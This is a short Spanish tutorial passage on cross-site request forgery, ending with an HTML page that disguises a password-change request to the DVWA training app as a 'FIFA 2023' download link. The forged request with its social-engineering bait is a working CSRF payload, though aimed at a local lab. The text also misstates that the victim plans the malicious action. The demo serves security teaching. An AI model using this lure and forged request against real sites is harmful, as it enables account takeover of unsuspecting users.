El cross-site request forgery (CSRF) es un ciberataque web que consiste en realizar tareas dentro de una aplicación por medio de la ejecución de un enlace en el navegador de la víctima. El payload de este ciberataque se ejecuta por medio de un enlace que se crea a partir de una petición que contiene la acción maliciosa planeada por la víctima. Para entender de manera práctica cómo todo esto es posible, a continuación veremos un ejemplo de cross-site request forgery en la aplicación deliberadamente vulnerable DVWA.
```
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=dwvice-width, initial-scale=1.0">
	<title>Document</title>
</head>
<body>
	<h3>Click to download FIFA 2023</h3>
	<a href="http://localhost/DVWA/vulnerabilities/csrf/?password_new=12345&password_conf=12345&Change=Change#">FIFA 2023</a>
</body>
</html>
```
